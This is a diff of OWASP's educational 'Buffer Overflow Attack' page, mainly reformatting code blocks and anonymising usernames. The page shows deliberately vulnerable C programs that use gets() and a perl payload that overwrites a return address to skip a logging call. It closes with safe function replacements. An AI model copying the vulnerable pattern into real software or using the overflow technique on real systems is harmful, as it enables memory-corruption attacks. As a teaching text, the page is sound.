@@ -3,10 +3,9 @@
 layout: col-sidebar
 title: Buffer Overflow Attack
 author: 
-contributors:
+contributors: OWASP, Rezos, Thaigoalz, KristenS, Andrew Smith, Jmanico, hblankenship , nbaars, cmvar8, CRImier, pranavek, hblankenship , tghosth, nbaars, k-37, kingthorin
 permalink: /attacks/Buffer_overflow_attack
 tags: attack, buffer overflow
-auto-migrated: 1
 
 ---
 
@@ -22,31 +21,27 @@ exceptions, segmentation faults, and other errors to occur. Usually
 these errors end execution of the application in an unexpected way.
 Buffer overflow errors occur when we operate on buffers of char type.
 
-Buffer overflows can consist of overflowing the stack ([Stack
-overflow](Stack_overflow "wikilink")) or overflowing the heap ([Heap
-overflow](Heap_overflow "wikilink")). We don't distinguish between these
+Buffer overflows can consist of overflowing the stack [Stack
+overflow] or overflowing the heap [Heap
+overflow]. We don't distinguish between these
 two in this article to avoid confusion.
 
 Below examples are written in C language under GNU/Linux system on x86
 architecture.
 
-## Risk Factors
-
-TBD
-
 ## Examples
 
 ### Example 1
 
-```
-  #include <stdio.h>
-  int main(int argc, char **argv)
-  {
-  char buf[8]; // buffer for eight characters
-  gets(buf); // read from stdio (sensitive function!)
-  printf("%s\n", buf); // print out data stored in buf
-  return 0; // 0 as return value
-  }
+```C
+#include <stdio.h>
+int main(int argc, char **argv)
+{
+char buf[8]; // buffer for eight characters
+gets(buf); // read from stdio (sensitive function!)
+printf("%s\n", buf); // print out data stored in buf
+return 0; // 0 as return value
+}
 ```
 
 This very simple application reads from the standard input an array of
@@ -56,11 +51,11 @@ buffer is displayed and the application exits.
 
 Program compilation:
 
-```
-  rezos@spin ~/inzynieria $ gcc bo-simple.c -o bo-simple
-  /tmp/ccECXQAX.o: In function `main':
-  bo-simple.c:(.text+0x17): warning: the `gets' function is dangerous and
-  should not be used.
+```console
+user@spin ~/inzynieria $ gcc bo-simple.c -o bo-simple
+/tmp/ccECXQAX.o: In function `main':
+bo-simple.c:(.text+0x17): warning: the `gets' function is dangerous and
+should not be used.
 ```
 
 At this stage, even the compiler suggests that the function gets() isn't
@@ -68,14 +63,14 @@ safe.
 
 Usage example:
 
-```
-  rezos@spin ~/inzynieria $ ./bo-simple // program start
-  1234 // we eneter "1234" string from the keyboard
-  1234 // program prints out the conent of the buffer
-  rezos@spin ~/inzynieria $ ./bo-simple // start
-  123456789012 // we eneter "123456789012"
-  123456789012 // content of the buffer "buf" ?!?!
-  Segmentation fault // information about memory segmenatation fault
+```console
+user@spin ~/inzynieria $ ./bo-simple // program start
+1234 // we eneter "1234" string from the keyboard
+1234 // program prints out the conent of the buffer
+user@spin ~/inzynieria $ ./bo-simple // start
+123456789012 // we eneter "123456789012"
+123456789012 // content of the buffer "buf" ?!?!
+Segmentation fault // information about memory segmenatation fault
 ```
 
 We manage (un)luckily to execute the faulty operation by the program,
@@ -96,57 +91,57 @@ data stored in this memory area.
 
 ### Example 2
 
-```
-  #include <stdio.h>
-  #include <string.h>
+```C
+#include <stdio.h>
+#include <string.h>
 
-  void doit(void)
-  {
-          char buf[8];
+void doit(void)
+{
+        char buf[8];
 
-          gets(buf);
+        gets(buf);
           printf("%s\n", buf);
-  }
+}
 
-  int main(void)
-  {
-          printf("So... The End...\n");
-          doit();
-          printf("or... maybe not?\n");
+int main(void)
+{
+        printf("So... The End...\n");
+        doit();
+        printf("or... maybe not?\n");
 
-          return 0;
-  }
+        return 0;
+}
 ```
 
 This example is analogous to the first one. In addition, before and
 after the doit() function, we have two calls to function printf().
 
-```
-  Compilation:
+```console
+Compilation:
 
-  rezos@dojo-labs ~/owasp/buffer_overflow $ gcc example02.c -o example02
-  -ggdb
-  /tmp/cccbMjcN.o: In function `doit':
-  /home/rezos/owasp/buffer_overflow/example02.c:8: warning: the `gets'
-  function is dangerous and should not be used.
+user@dojo-labs ~/owasp/buffer_overflow $ gcc example02.c -o example02
+-ggdb
+/tmp/cccbMjcN.o: In function `doit':
+/home/user/owasp/buffer_overflow/example02.c:8: warning: the `gets'
+function is dangerous and should not be used.
 
-  Usage example:
-  rezos@dojo-labs ~/owasp/buffer_overflow $ ./example02
-  So... The End...
-  TEST                   // user data on input
-  TEST                  // print out stored user data
-  or... maybe not?
+Usage example:
+user@dojo-labs ~/owasp/buffer_overflow $ ./example02
+So... The End...
+TEST                   // user data on input
+TEST                  // print out stored user data
+or... maybe not?
 ```
 
 The program between the two defined printf() calls displays the content
 of the buffer, which is filled with data entered by the user.
 
-```
-  rezos@dojo-labs ~/owasp/buffer_overflow $ ./example02
-  So... The End...
-  TEST123456789
-  TEST123456789
-  Segmentation fault
+```console
+user@dojo-labs ~/owasp/buffer_overflow $ ./example02
+So... The End...
+TEST123456789
+TEST123456789
+Segmentation fault
 ```
 
 Because the size of the buffer was defined (char buf\[8\]) and it was
@@ -160,41 +155,43 @@ the buffer overflow error.
 Below is output produced by the objdump. From that output we are able to
 find addresses, where printf() is called (0x80483d6 and 0x80483e7).
 
-```
-  rezos@dojo-labs ~/owasp/buffer_overflow $ objdump -d ./example02
+```console
+user@dojo-labs ~/owasp/buffer_overflow $ objdump -d ./example02
 
-  080483be <main>:
-   80483be:       8d 4c 24 04             lea    0x4(%esp),%ecx
-   80483c2:       83 e4 f0                and    $0xfffffff0,%esp
-   80483c5:       ff 71 fc                pushl  0xfffffffc(%ecx)
-   80483c8:       55                      push   %ebp
-   80483c9:       89 e5                   mov    %esp,%ebp
-   80483cb:       51                      push   %ecx
-   80483cc:       83 ec 04                sub    $0x4,%esp
-   80483cf:       c7 04 24 bc 84 04 08    movl   $0x80484bc,(%esp)
-   80483d6:       e8 f5 fe ff ff          call   80482d0 <puts@plt>
-   80483db:       e8 c0 ff ff ff          call   80483a0 <doit>
-   80483e0:       c7 04 24 cd 84 04 08    movl   $0x80484cd,(%esp)
-   80483e7:       e8 e4 fe ff ff          call   80482d0 <puts@plt>
-   80483ec:       b8 00 00 00 00          mov    $0x0,%eax
-   80483f1:       83 c4 04                add    $0x4,%esp
-   80483f4:       59                      pop    %ecx
-   80483f5:       5d                      pop    %ebp
-   80483f6:       8d 61 fc                lea    0xfffffffc(%ecx),%esp
-   80483f9:       c3                      ret
-   80483fa:       90                      nop
-   80483fb:       90                      nop
+ 080483be <main>:
+ 80483be:       8d 4c 24 04             lea    0x4(%esp),%ecx
+ 80483c2:       83 e4 f0                and    $0xfffffff0,%esp
+ 80483c5:       ff 71 fc                pushl  0xfffffffc(%ecx)
+ 80483c8:       55                      push   %ebp
+ 80483c9:       89 e5                   mov    %esp,%ebp
+ 80483cb:       51                      push   %ecx
+ 80483cc:       83 ec 04                sub    $0x4,%esp
+ 80483cf:       c7 04 24 bc 84 04 08    movl   $0x80484bc,(%esp)
+ 80483d6:       e8 f5 fe ff ff          call   80482d0 <puts@plt>
+ 80483db:       e8 c0 ff ff ff          call   80483a0 <doit>
+ 80483e0:       c7 04 24 cd 84 04 08    movl   $0x80484cd,(%esp)
+ 80483e7:       e8 e4 fe ff ff          call   80482d0 <puts@plt>
+ 80483ec:       b8 00 00 00 00          mov    $0x0,%eax
+ 80483f1:       83 c4 04                add    $0x4,%esp
+ 80483f4:       59                      pop    %ecx
+ 80483f5:       5d                      pop    %ebp
+ 80483f6:       8d 61 fc                lea    0xfffffffc(%ecx),%esp
+ 80483f9:       c3                      ret
+ 80483fa:       90                      nop
+ 80483fb:       90                      nop
 ```
 
 If the second call to printf() would inform the administrator about user
 logout (e.g. closed session), then we can try to omit this step and
 finish without the call to printf().
 
-    rezos@dojo-labs ~/owasp/buffer_overflow $ perl -e 'print "A"x12
-    ."\xf9\x83\x04\x08"' | ./example02
-    So... The End...
-    AAAAAAAAAAAAu*.
-    Segmentation fault
+```console
+user@dojo-labs ~/owasp/buffer_overflow $ perl -e 'print "A"x12
+  ."\xf9\x83\x04\x08"' | ./example02
+  So... The End...
+  AAAAAAAAAAAAu*.
+  Segmentation fault
+```
 
 The application finished its execution with segmentation fault, but the
 second call to printf() had no place.
@@ -205,11 +202,11 @@ perl -e 'print "A"x12 ."\\xf9\\x83\\x04\\x08"' - will print out twelve
 "A" characters and then four characters, which are in fact an address of
 the instruction we want to execute. Why twelve?
 
-```
-     8 // size of buf (char buf[8])
-  +  4 // four additional bytes for overwriting stack frame pointer
-  ----
-    12
+```console
+   8 // size of buf (char buf[8])
++  4 // four additional bytes for overwriting stack frame pointer
+----
+  12
 ```
 
 Problem analysis:
@@ -223,10 +220,10 @@ How to use buffer overflow errors in a different way?
 
 Generally, exploitation of these errors may lead to:
 
-  - application DoS
-  - reordering execution of functions
-  - code execution (if we are able to inject the shellcode, described in
-    the separate document)
+- application DoS
+- reordering execution of functions
+- code execution (if we are able to inject the shellcode, described in
+  the separate document)
 
 How are buffer overflow errors are made?
 
@@ -235,21 +232,21 @@ programmer's nightmare. The problem lies in native C functions, which
 don't care about doing appropriate buffer length checks. Below is the
 list of such functions and, if they exist, their safe equivalents:
 
-  - gets() -\> fgets() - read characters
-  - strcpy() -\> strncpy() - copy content of the buffer
-  - strcat() -\> strncat() - buffer concatenation
-  - sprintf() -\> snprintf() - fill buffer with data of different types
-  - (f)scanf() - read from STDIN
-  - getwd() - return working directory
-  - realpath() - return absolute (full) path
+- `gets() -\> fgets()` - read characters
+- `strcpy() -\> strncpy()` - copy content of the buffer
+- `strcat() -\> strncat()` - buffer concatenation
+- `sprintf() -\> snprintf()` - fill buffer with data of different types
+- `(f)scanf()` - read from STDIN
+- `getwd()` - return working directory
+- `realpath()` - return absolute (full) path
 
 Use safe equivalent functions, which check the buffers length, whenever
 it's possible. Namely:
 
-1.  gets() -\> fgets()
-2.  strcpy() -\> strncpy()
-3.  strcat() -\> strncat()
-4.  sprintf() -\> snprintf()
+1.  `gets() -\> fgets()`
+2.  `strcpy() -\> strncpy()`
+3.  `strcat() -\> strncat()`
+4.  `sprintf() -\> snprintf()`
 
 Those functions which don't have safe equivalents should be rewritten
 with safe checks implemented. Time spent on that will benefit in the
